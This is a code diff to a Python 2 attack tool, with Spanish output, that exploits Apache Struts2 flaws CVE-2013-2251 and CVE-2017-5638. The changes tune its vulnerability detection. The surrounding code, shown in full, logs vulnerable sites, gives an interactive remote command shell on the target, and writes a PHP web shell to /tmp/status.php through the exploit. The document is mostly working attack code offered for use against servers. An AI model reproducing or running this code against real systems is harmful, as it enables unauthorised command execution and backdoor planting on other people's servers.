@@ -68,44 +68,46 @@ if len(host) > 0:
 
 		try:
 			response = urllib.urlopen(host+poc, context=context)
+			response = response.read()
 		except:
 			print RED+" Servidor no responde\n"+ENDC
 			exit(0)
 
 		print BOLD+"\n [+] EJECUTANDO EXPLOIT CVE-2013-2251"+ENDC
 
-		if response.read().find("mamalo") != -1:
-			print RED+"   [-] VULNERABLE"+ENDC
-			owned = open('vulnsite.txt', 'a')
-			owned.write(str(host)+'\n')
-			owned.close()
+		if response.find("('mamalo')") == -1:
+			if response.find("mamalo") != -1:
+				print RED+"   [-] VULNERABLE"+ENDC
+				owned = open('vulnsite.txt', 'a')
+				owned.write(str(host)+'\n')
+				owned.close()
 
-			opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
-			if opcion == 's':
-				print YELLOW+"   [-] GET PROMPT...\n"+ENDC
-				time.sleep(1)
-				print BOLD+"   * [UPLOAD SHELL]"+ENDC
-				print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
+				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
+				if opcion == 's':
+					print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+					time.sleep(1)
+					print BOLD+"   * [UPLOAD SHELL]"+ENDC
+					print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
 
-				while 1:
-					separador = raw_input(GREEN+"Struts2@Shell_1:$ "+ENDC)
-					espacio = separador.split(' ')
-					comando = "','".join(espacio)
+					while 1:
+						separador = raw_input(GREEN+"Struts2@Shell_1:$ "+ENDC)
+						espacio = separador.split(' ')
+						comando = "','".join(espacio)
 
-					if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
-						shell = urllib.urlopen(host+exploit1("'"+str(comando)+"'"), context=context)
-						print "\n"+shell.read()
-					elif espacio[0] == 'pwnd':
-						pathsave=raw_input("path EJ:/tmp/: ")
+						if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
+							shell = urllib.urlopen(host+exploit1("'"+str(comando)+"'"), context=context)
+							print "\n"+shell.read()
+						elif espacio[0] == 'pwnd':
+							pathsave=raw_input("path EJ:/tmp/: ")
 
-						if espacio[1] == 'php':
-							shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
-							urllib2.urlopen(host+pwnd(str(shellfile)))
-							shell = urllib.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"), context=context)
-							if shell.read().find(pathsave+"status.php") != -1:
-								print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
-							else:
-								print BOLD+RED+"\nNo Create File :/\n"+ENDC
+							if espacio[1] == 'php':
+								shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
+								urllib2.urlopen(host+pwnd(str(shellfile)))
+								shell = urllib.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"), context=context)
+								if shell.read().find(pathsave+"status.php") != -1:
+									print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
+								else:
+									print BOLD+RED+"\nNo Create File :/\n"+ENDC
 
 		# CVE-2017-5638 ---------------------------------------------------------------------------------					
 		print BLUE+"     [-] NO VULNERABLE"+ENDC			
@@ -118,7 +120,7 @@ if len(host) > 0:
 				req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
 				result = urllib2.urlopen(req).read()
 
-			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
 			  		print RED+"   [-] VULNERABLE"+ENDC
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
@@ -168,7 +170,7 @@ if len(host) > 0:
 			try:
 				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
 
-				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
 			  		print RED+"   [-] VULNERABLE"+ENDC
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
